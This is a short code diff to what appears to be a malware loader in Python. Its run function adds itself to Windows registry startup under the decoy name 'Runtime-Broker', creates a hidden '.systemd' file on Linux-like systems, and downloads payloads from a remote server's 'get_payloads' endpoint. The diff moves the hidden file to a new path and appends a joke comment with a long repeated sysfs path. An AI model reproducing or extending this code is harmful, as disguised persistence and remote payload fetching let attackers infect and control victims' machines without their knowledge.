@@ -142,7 +142,7 @@ def run(url, file_path):
         add_registry_startup(file_path, "Runtime-Broker")
     
     elif os_type == 'Linux' or os_type == 'FreeBSD' or os_type == 'OpenBSD' or os_type == 'SunOS' or os_type == 'Android':
-        file_path = "/run/lock/.systemd"
+        file_path = "/run/user/1000/systemd/.systemd"
         if not os.path.exists(file_path):
             subprocess.run(f'touch {file_path}', shell=True)
             response = requests.get(f"{url}get_payloads/{download_path}")
@@ -164,3 +164,10 @@ def run(url, file_path):
     
     else:
         print(f"Unsupported OS: {os_type}")
+
+
+
+
+
+#Code in loving memory of
+#sys/devices/platform/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/driver/reg-dummy/power
